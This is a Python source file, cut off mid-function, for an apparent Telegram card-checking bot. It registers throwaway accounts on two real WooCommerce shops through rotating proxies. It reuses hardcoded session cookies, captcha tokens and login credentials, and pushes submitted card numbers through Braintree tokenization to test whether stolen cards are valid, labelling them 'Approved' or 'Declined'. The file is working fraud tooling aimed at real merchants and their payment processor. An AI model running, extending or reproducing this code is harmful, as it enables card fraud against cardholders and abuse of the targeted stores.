import os,sys
import random
import telebot
import requests,random,time,string,base64
from bs4 import BeautifulSoup
import os,json
import base64
from telebot import types
import time,requests
from re import findall
import user_agent
import re
import requests.exceptions
import cloudscraper
import random
import string
import threading
import time
import uuid

PROXY_FILE = "proxies.txt"
GLOBAL_PROXIES = []

def load_proxies():
    try:
        with open(PROXY_FILE, "r") as f:
            proxies = [line.strip() for line in f if line.strip()]
            print(f"Loaded {len(proxies)} proxies from {PROXY_FILE}")
            return proxies
    except FileNotFoundError:
        print(f"Warning: Proxy file '{PROXY_FILE}' not found. Running without proxies.")
        return []
    except Exception as e:
        print(f"Error loading proxies from '{PROXY_FILE}': {e}")
        return []

def get_random_proxy_dict():
    if not GLOBAL_PROXIES:
        return None

    selected_proxy_url = random.choice(GLOBAL_PROXIES)
    
    proxies_dict = {
        "http": selected_proxy_url,
        "https": selected_proxy_url,
    }
    print(f"Using proxy: {selected_proxy_url}")
    return proxies_dict

GLOBAL_PROXIES = load_proxies()


acc = None

def generate_random_account():
    global acc
    name = ''.join(random.choices(string.ascii_lowercase, k=20))
    number = ''.join(random.choices(string.digits, k=4))
    acc = f"{name}{number}@gmail.com"
    return acc

def generate_emails_periodically():
    while True:
        generate_random_account()
        time.sleep(0.1)

thread = threading.Thread(target=generate_emails_periodically)
thread.start()

def dato(zh):
    try:
        api_url = requests.get("https://bins.antipublic.cc/bins/"+zh, timeout=10).json()
        brand=api_url["brand"]
        card_type=api_url["type"]
        level=api_url["level"]
        bank=api_url["bank"]
        country_name=api_url["country_name"]
        country_flag=api_url["country_flag"]
        mn = f'''ϟ BIN Info -> {brand} - {card_type} - {level}
ϟ Bank -> {bank} - {country_flag}
ϟ Country -> {country_name} [ {country_flag} ]'''
        return mn
    except Exception as e:
        print(f"Error in BIN lookup: {e}")
        return 'No info'
		
		
def Tele(ccx):
    proxies = get_random_proxy_dict()
    ccx = ccx.strip()
    parts = re.split(r'[ |/]', ccx)
    c = parts[0]
    mm = parts[1]
    ex = parts[2]
    cvc = parts[3]
    try:
        yy = ex[2] + ex[3]
        if '2' in ex[3] or '1' in ex[3]:
            yy = ex[2] + '7'
        else:
            pass
    except:
        yy = ex[0] + ex[1]
        if '2' in ex[1] or '1' in ex[1]:
            yy = ex[0] + '7'
        else:
            pass
            
    r=requests.session()
    user = user_agent.generate_user_agent()
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    email = f"{username}@gmail.com"
    
    headers = {
        'authority': 'www.flexinnovations.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9,it;q=0.8,ar;q=0.7',
        'cache-control': 'max-age=0',
        'referer': 'https://www.flexinnovations.com/my-account/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }
    
    try:
        rrr = r.get('https://www.flexinnovations.com/my-account/', headers=headers, proxies=proxies, timeout=15)
    except requests.exceptions.RequestException as e:
        print(f"Error in Tele - initial GET: {e}")
        return "ERROR: Proxy/Connection Failed"
    
    login=re.findall(r'name="woocommerce-register-nonce" value="(.*?)"',rrr.text)[0]
    
    headers = {
        'authority': 'www.flexinnovations.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9,it;q=0.8,ar;q=0.7',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.flexinnovations.com',
        'referer': 'https://www.flexinnovations.com/my-account/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }
    
    data = {
        'email': email,
        'mailchimp_woocommerce_newsletter': '1',
        'cf-turnstile-response': '0.Cv4ft1bh0oL5q4jGqNySI5H4SFehsI-QhvU_YKfqaiX8akpQOiABYuLOudhD_bYTpEn3b6LTZMarFybo_s6u5SDU6ewYKwpgQ7ob0cFt4Ry73bAVPY6w16DDMpr0k-9pXGVjTIqSleRFzQohpx96RzwQDnl9DNqQfXKKEksg8r3LFKli-mym3wlOaF02SIslf_Zlo_BPHBX3IPyYfoBW3TxLRAdeZcPIqdQrKmjdEXQJ2Tc5DE5aDjPLgkHyC8106kWYY4CEA8i7XWjtFXf80VEJfgwBtlPjhOChXhAeeXfQqJAmAanhn4ejYXxzRf7AYxIDe2yutxgR3vMtW-n-vuaTzrzwmu4F3rv2PGLMIZoa6F6xAQGF7WG8_wWHCSHEnvx2FZNUQF3dKcZLPJsMz6eupZse7RxNDCscDCPr3KFH7caYSAhJ9VkMgppdcNIBfUO3N8gKT9EXahoUM-Z8n3oeeOLMLQeqr35SNVZDkEOfbRVnWmqiklt67QMtbF3PDV1rveYEfYSNkOkw0FGlq8UIRZzwizKKpZLrHXijxqx1zpLHWm-kZAYhzJkfvmvYWLxBdF6cAR92El-gJagkt3mUzufLyYZGMulZMKH2BKfJPP_68PgZyuTvlq_dDiQHhO-EPjysQ1KLVHikCN-bH0Me4M6SxLqGpCMkYrWBmPECE_1YNh_-Li7YHTtL5fVaGvt1iDaznNscK4B5vegMXpX5YavpTFYVZgo4V76IBlSRrlmXUW1ai6Gl8rk6MDiWTty_NPtO2hMq7kOK0BebSJc2kVVbH8SEzFU0HAYOre0MbgqAYzW7Otoster-fhBDTh1q9ZSfZRjbGMS_vMl-p7lamnwgGtnpXgwx1wnDjUWi9Hyx9g8TFe8zYC1Tt6Mv_USRU68MP7Y1Fy3_gIhBTg.i3Ao1WVhrDDM14iPCxBKXA.2f53bb5ea98d0dc76f6da0adf670cadb03d3fb4c997d3052c8ac61519daa5afa',
        'woocommerce-register-nonce': login,
        '_wp_http_referer': '/my-account/',
        'register': 'Register',
    }
    
    try:
        response = r.post('https://www.flexinnovations.com/my-account/', headers=headers, data=data, proxies=proxies, timeout=15)
    except requests.exceptions.RequestException as e:
        print(f"Error in Tele - register POST: {e}")
        return "ERROR: Proxy/Connection Failed"
    
    cookies = {
        '_ga': 'GA1.1.754325811.1748639323',
        'mailchimp_landing_site': 'https%3A%2F%2Fwww.flexinnovations.com%2Fmy-account%2Fadd-payment-methods%2F',
        'PHPSESSID': '608a920d3298b9fe19ba7c6050808d1a',
        'wordpress_test_cookie': 'WP%20Cookie%20check',
        'mailchimp.cart.current_email': email,
        'mailchimp.cart.previous_email':email,
        'mailchimp_user_email':email,
        'wordpress_logged_in_a3a6a1469a1091436aba07df5e7aa87a': 'euororoeo%7C1752520615%7Cs694gktyKVbk6KsGN8Co5fctq6bsAgN1TlO72bUBB20%7C383952ad79b2411fb05998e6e4e9d38ddaef07e6dacac2e08435673511a8bf97',
        'tinv_wishlistkey': '1b9489',
        'tinvwl_wishlists_data_counter': '0',
        '_ga_5BLLY83SK2': 'GS2.1.s1751310980$o5$g1$t1751311171$j18$l0$h0',
    }
        
    headers = {
            'authority': 'www.flexinnovations.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9,it;q=0.8,ar;q=0.7',
            'referer': 'https://www.flexinnovations.com/my-account/edit-address/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': user,
        }
        
    try:
        hh = r.get('https://www.flexinnovations.com/my-account/edit-address/billing/', cookies=cookies, headers=headers, proxies=proxies, timeout=15)
    except requests.exceptions.RequestException as e:
        print(f"Error in Tele - billing GET: {e}")
        return "ERROR: Proxy/Connection Failed"
    
    
    address = re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', hh.text).group(1)
    
    headers = {
        'authority': 'www.flexinnovations.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9,it;q=0.8,ar;q=0.7',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.flexinnovations.com',
        'referer': 'https://www.flexinnovations.com/my-account/edit-address/billing/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }
    
    data = {
        'billing_first_name': 'irordioos',
        'billing_last_name': 'eugoeo',
        'billing_company': 'california ',
        'billing_country': 'US',
        'billing_address_1': '7006 STANFORD AVE',
        'billing_address_2': 'CA 90001-1583',
        'billing_city': 'california ',
        'billing_state': 'CA',
        'billing_postcode': '90001',
        'billing_phone': '2055550123',
        'billing_email': email,
        'save_address': 'Save address',
        'woocommerce-edit-address-nonce': address,
        '_wp_http_referer': '/my-account/edit-address/billing/',
        'action': 'edit_address',
    }
    
    try:
        response = r.post(
            'https://www.flexinnovations.com/my-account/edit-address/billing/',
            headers=headers,
            data=data,
            proxies=proxies,
            timeout=15
        )
    except requests.exceptions.RequestException as e:
        print(f"Error in Tele - edit address POST: {e}")
        return "ERROR: Proxy/Connection Failed"
    
    cookies = {
            '_ga': 'GA1.1.754325811.1748639323',
            'mailchimp_landing_site': 'https%3A%2F%2Fwww.flexinnovations.com%2Fmy-account%2Fadd-payment-methods%2F',
            'PHPSESSID': '608a920d3298b9fe19ba7c6050808d1a',
            'wordpress_test_cookie': 'WP%20Cookie%20check',
            'mailchimp.cart.current_email': email,
            'mailchimp.cart.previous_email':email,
            'mailchimp_user_email':email,
            'wordpress_logged_in_a3a6a1469a1091436aba07df5e7aa87a': 'euororoeo%7C1752520615%7Cs694gktyKVbk6KsGN8Co5fctq6bsAgN1TlO72bUBB20%7C383952ad79b2411fb05998e6e4e9d38ddaef07e6dacac2e08435673511a8bf97',
            'tinv_wishlistkey': '1b9489',
            'tinvwl_wishlists_data_counter': '0',
            '_ga_5BLLY83SK2': 'GS2.1.s1751310980$o5$g1$t1751311171$j18$l0$h0',
        }
        
    headers = {
            'authority': 'www.flexinnovations.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9,it;q=0.8,ar;q=0.7',
            'referer': 'https://www.flexinnovations.com/my-account/payment-methods/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        
    try:
        mmx = r.get('https://www.flexinnovations.com/my-account/add-payment-methods/', cookies=cookies, headers=headers, proxies=proxies, timeout=15)
    except requests.exceptions.RequestException as e:
        print(f"Error in Tele - add payment methods GET (1): {e}")
        return "ERROR: Proxy/Connection Failed"
        
    nonce=re.findall(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"',mmx.text)[0]
        
    headers = {
            'authority': 'www.flexinnovations.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9,it;q=0.8,ar;q=0.7',
            'referer': 'https://www.flexinnovations.com/my-account/payment-methods/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        
    try:
        response = r.get('https://www.flexinnovations.com/my-account/add-payment-methods/', headers=headers, proxies=proxies, timeout=15)
    except requests.exceptions.RequestException as e:
        print(f"Error in Tele - add payment methods GET (2): {e}")
        return "ERROR: Proxy/Connection Failed"
        
    client = re.search(r'client_token_nonce":"([^"]+)"', response.text).group(1)
    
    headers = {
        'authority': 'www.flexinnovations.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,it;q=0.8,ar;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.flexinnovations.com',
        'referer': 'https://www.flexinnovations.com/my-account/add-payment-methods/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    
    data = {
        'action': 'wc_braintree_credit_card_get_client_token',
        'nonce': client,
    }
    
    try:
        response = r.post('https://www.flexinnovations.com/wp-admin/admin-ajax.php', headers=headers, data=data, proxies=proxies, timeout=15)
    except requests.exceptions.RequestException as e:
        print(f"Error in Tele - ajax POST: {e}")
        return "ERROR: Proxy/Connection Failed"
        
    enc = response.json()['data']
    dec = base64.b64decode(enc).decode('utf-8')
    auth=re.findall(r'"authorizationFingerprint":"(.*?)"',dec)[0]
    
    headers = {
        'authority': 'payments.braintree-api.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,it;q=0.8,ar;q=0.7',
        'authorization': f'Bearer {auth}',
        'braintree-version': '2018-05-10',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'referer': 'https://assets.braintreegateway.com/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }
    
    json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'custom',
            'sessionId': str(uuid.uuid4()),
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': c,
                    'expirationMonth': mm,
                    'expirationYear': yy,
                    'cvv': cvc,
                },
                'options': {
                    'validate': False,
                },
            },
        },
        'operationName': 'TokenizeCreditCard',
    }
    
    try:
        response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data, proxies=proxies, timeout=15)
        tok=(response.json()['data']['tokenizeCreditCard']['token'])
    except requests.exceptions.RequestException as e:
        print(f"Error in Tele - Braintree GraphQL POST: {e}")
        return "ERROR: Proxy/Connection Failed"
    except KeyError:
        return "Declined - Tokenization Failed"
    
    cookies = {
        '_ga': 'GA1.1.754325811.1748639323',
        'mailchimp_landing_site': 'https%3A%2F%2Fwww.flexinnovations.com%2Fmy-account%2Fadd-payment-methods%2F',
        'mailchimp_user_email': email,
        'wordpress_logged_in_a3a6a1469a1091436aba07df5e7aa87a': 'euororoeo%7C1752520615%7Cs694gktyKVbk6KsGN8Co5fctq6bsAgN1TlO72bUBB20%7C383952ad79b2411fb05998e6e4e9d38ddaef07e6dacac2e08435673511a8bf97',
        'tinv_wishlistkey': '1b9489',
        'tinvwl_wishlists_data_counter': '0',
        'PHPSESSID': 'd3b0da5640ee1ba7b7e6d0d0f11d1485',
        '_ga_5BLLY83SK2': 'GS2.1.s1751489027$o7$g1$t1751489032$j55$l0$h0',
    }
    
    headers = {
        'authority': 'www.flexinnovations.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9,it;q=0.8,ar;q=0.7',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.flexinnovations.com',
        'referer': 'https://www.flexinnovations.com/my-account/add-payment-methods/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }
    
    data = [
        ('payment_method', 'braintree_credit_card'),
        ('wc-braintree-credit-card-card-type', 'visa'),
        ('wc-braintree-credit-card-3d-secure-enabled', ''),
        ('wc-braintree-credit-card-3d-secure-verified', ''),
        ('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
        ('wc_braintree_credit_card_payment_nonce', tok),
        ('wc_braintree_device_data', '{"correlation_id":"e6fb91b12489802adccd71c877c5ab87"}'),
        ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
        ('wc_braintree_paypal_payment_nonce', ''),
        ('wc_braintree_device_data', '{"correlation_id":"e6fb91b12489802adccd71c877c5ab87"}'),
        ('wc_braintree_paypal_amount', '0.00'),
        ('wc_braintree_paypal_currency', 'USD'),
        ('wc_braintree_paypal_locale', 'en_us'),
        ('wc-braintree-paypal-tokenize-payment-method', 'true'),
        ('woocommerce-add-payment-method-nonce', nonce),
        ('_wp_http_referer', '/my-account/add-payment-methods/'),
        ('woocommerce_add_payment_method', '1'),
    ]
    
    try:
        response = requests.post(
            'https://www.flexinnovations.com/my-account/add-payment-methods/',
            cookies=cookies,
            headers=headers,
            data=data,
            proxies=proxies,
            timeout=15
        )
        text = response.text
    except requests.exceptions.RequestException as e:
        print(f"Error in Tele - final POST: {e}")
        return "ERROR: Proxy/Connection Failed"
    
    pattern = r'Reason: (.+?)\s*</li>'
    match = re.search(pattern, text)
    if match:
        result = match.group(1)
        if 'risk_threshold' in text:
            result = "RISK: Retry this BIN later."
    else:
        if 'added' in text or 'Payment method successfully added.' in text:
            result = "Approved ✅"
            return result
        else:
            try:
                result = text.split('Status code ')[1].split('<')[0]
            except:
                try:
                    result = match
                except:
                    result = 'Unknow Response'

    if 'risk_threshold' in result:
            return "RISK: Retry this BIN later."
    elif 'You cannot add a new payment method so soon after the previous one' in result:
            return "Please wait for 20 seconds."
    elif 'Nice! New payment method added' in result or 'Payment method successfully added.' in text:
            return 'Approved ✅'
    elif 'Duplicate card exists in the vault.' in result:
            return 'Approved ✅! - Duplicate'
    elif "avs: Gateway Rejected: avs" in result or "avs_and_cvv: Gateway Rejected: avs_and_cvv" in result or "cvv: Gateway Rejected: cvv" in result:
            return 'Approved ✅! - AVS-CVV'
    elif "Invalid postal code" in result or "CVV." in result:
            return 'Approved ✅! - Invalid postal code and cvv'
    elif "Card Issuer Declined CVV" in result:
            return 'Approved ✅! - Declined CVV'
    elif not re.search(r'[A-Za-z]', result) and not re.search(r'[0-9]', result):
            return 'Approved ✅!'
    else:
        return result
		
		
def Tele2(ccx):
    proxies = get_random_proxy_dict()
    ccx = ccx.strip()
    parts = re.split(r'[ |/]', ccx)
    c = parts[0]
    mm = parts[1]
    ex = parts[2]
    cvc = parts[3]
    try:
        yy = ex[2] + ex[3]
        if '2' in ex[3] or '1' in ex[3]:
            yy = ex[2] + '7'
        else:
            pass
    except:
        yy = ex[0] + ex[1]
        if '2' in ex[1] or '1' in ex[1]:
            yy = ex[0] + '7'
        else:
            pass
            
    r=requests.session()
    user = user_agent.generate_user_agent()
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    User  = f"{username}isididkkdkd"
    email = f"{username}@gmail.com"

    headers = {
        'authority': 'altairtech.io',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9,it;q=0.8,ar;q=0.7',
        'cache-control': 'max-age=0',
        'referer': 'https://altairtech.io/account/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'upgrade-insecure-requests': '1',
        'user-agent': user,
    }
    
    try:
        rrr = r.get('https://altairtech.io/account/', headers=headers, proxies=proxies, timeout=15)
    except requests.exceptions.RequestException as e:
        print(f"Error in Tele2 - initial GET: {e}")
        return "ERROR: Proxy/Connection Failed"
    
    register=re.findall(r'name="woocommerce-register-nonce" value="(.*?)"',rrr.text)[0]
    login=re.findall(r'name="woocommerce-login-nonce" value="(.*?)"',rrr.text)[0]
    
    headers = {
        'authority': 'altairtech.io',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9,it;q=0.8,ar;q=0.7',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://altairtech.io',
        'referer': 'https://altairtech.io/account/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }
    
    data = {
        'username': 'yskg57650@gmail.com',
        'wfls-email-verification': '',
        'wfls-captcha-token': '03AFcWeA48QnNCPxp9Y4uuQrZ3DZ-VIzdXSj56b8QzNzU784XLF92OUxxOGUvO4znnniFDm9fzqwo0m4R5te9F_Fbt9YS7nV8mz58_KGlreatq1YeyZHbN73iCk1Qpgpdy97TyYcQaU6Ta6PBpEuuDLpL-k7hv9SIMn6SQObVAEqpO54v4Gcq5rnC37LcSn03ml7XbWlAkVA-UJqb8pyVwBnCm0Sx7IbFsc77urJ65wGusM9rYKO-HTDk8xOfP2ZBuwpIeh-yYIIu_RIfJpljm39QDrRzBx0WFvsD7BoI5ejCW8eG65W-L6g3jtMgBiCOGBB3oVO96iXg1g_8gQq-aCxNzb3cBqrLIjegZ6tVAOAbpGRQWk-IU1fFe4VCRUw4bqmeyr5YANYugN7So24Sl8tVUboaae4j3sqcVQjV3hvsiTwrgrsnD2h2XGG_O1JS15PsETDCKHU2j9kCv5ItlxobKeCrpW-A9DMIQ3CARIxVVUExfwKAwqjvRjERtZcO45jDNMh-s5eZWX0muEfSruRnmdi1X5drz2fMDZYgj2bTemGTj_IdFLky7KueopoJyCmTKc3peJ9ka0VhkYq5-qfPRlk_e4pJ4mirRwiyU6kdqhNmv6MzkVd6UZGeXE2nY9dijwbB41ilLCxk2TXNVDt4JJ3Rw8SvYfMvuJ57y_kIAcFMK-p7qQxaL6H1XndKi37g0IboCPLW-WdQT81dcrKQJWX5hEI8Kw5WYwbd4XA4TCRi6AxsQfx3u5ArNEh02gk3aUvBQCZqEyXEEk0U88Ksw2u3U8eB0I5cPeki0tsS__DIOEaRWbC4n9BN3mb-j59J60p1bKAbu5FzARMUO0IV0Ge2kksVrhexN9HCNQQJlnk-SpBRLD3A_Iv4_qiLSb20TaqGSXdK19MjwvKC4Of52XlwVG3e9ziaSfR1Xkm-t98p7e1_FO6F0zXG_dJIHu-gr5GB5jdX5tHFrsZM-cPOllh6C-Wl41tbayP9wXp0s7gnM92rq4UPKXUe_iWNwge45GZrE5lZUmvGBH91hh042ZvSA0nSlQPtULG1IlI5LpjjTXQEjcNqlbb4eUWaAiKWrYw9qzr5u5eN-cXbkC4KAWuMqnGyVVMSA_cR5k6dE5VAJ6PpUUPLypBpq4TreZZtjxIy-HM4IxcKMnq3lHkN0aSKlY3Zg9FPqJk5rW5V7aodXKa_e8dDbq-Wtsv5trO7ZZjMzQWfp2AGfkvt5YYHI9mPO5O2jPgo9EzxOn2GZCuk2kjqi5vm5rAqwUtlS1vaOJkpuoDodPtJxaqYpMtz0YTTuvugRdGWlmoOtIt7KCwT-DBUDmZ0fexCh-GGi77amIbIprXaVGchnfX22Debmq75F6N8al16yp3yJRjPGL8np63UXJKP-PEbwvQ8EbxbAvNlkt6mOyHf7598YlOt-cUhKO6NOSggHeCCCZfZYYoLK6WaxtgQVwjrn4uNa0b1lnIpGq_s8qen_wZDaIXb4NWclzVXgMHNcjG1Lwls8rJdnux8y0aNR_TqVJ_ySOz7hZc7MYoT5FugCXKg_CXw6G0ntJyX0MyxyTWCY99lZ_h4Wi8tx-Hkd6arYEi4hFOcSWTaMzdjeWqSKoxUYkD4XvV0ws2Bj4wYilCQcuBkgYRuEf_mQOvnFyGWSJE8IJpGQ-UORsDVzCxcs1IeLVqwlOSeDvpJoOyWK0B0SlBiS-ORA3ocXtXlK5dGXxztDkFMkDaJQrjO8Ft7xpJ3E8EQDKfGJ3ZWYp0vi_6AXWNdwjDwE8vdsSaAxkQfdPIuaUXBjn0R9dKJq7FUpEPa6888Ax5XNaiv--rsSTpluutsNrYaYHK-Xc7EQBV76IoDU6rkGCu6iAHRGre0JvCnTlpfIatiaFBgUDIX7qWg2nJPXfJ9mIeNTRirtkJDaV0q9U2NNl2SAtsoMrXJggHz2AJdyy2QDMNlw6Tdt70avm6olqjExUaAYhUCoPzG4m-utVcZa2isBRsGtElpt6pxk6xtPreKOZEHuiP6uKWv6RDCNTztQrDx81vZ50pKu0uqqtdpz8HKI4YdiJbXiw63rHELNeIswTdHJ_8OnVzdTLcsxGXTHijHAAS__gyYp2LVgKYr1WVrJpKmTr4ogtpH9V3NeIAle14AUhPoTYPfMRKPVmkZAmwQN5hcJxj_7Itpy3Z2vV232st5Dsd4OsdKpK_sLgdbqqNKQcpHzNczS8ilEhq-_M9r8JgppMlQbDRAotY6ZpoJjiriTOwwSv6qgC8e-QF4q5oUS5CSnfcwD3EadbMiZbI1cZg4',
        'password': 'bVSfh8nkjXR8snM',
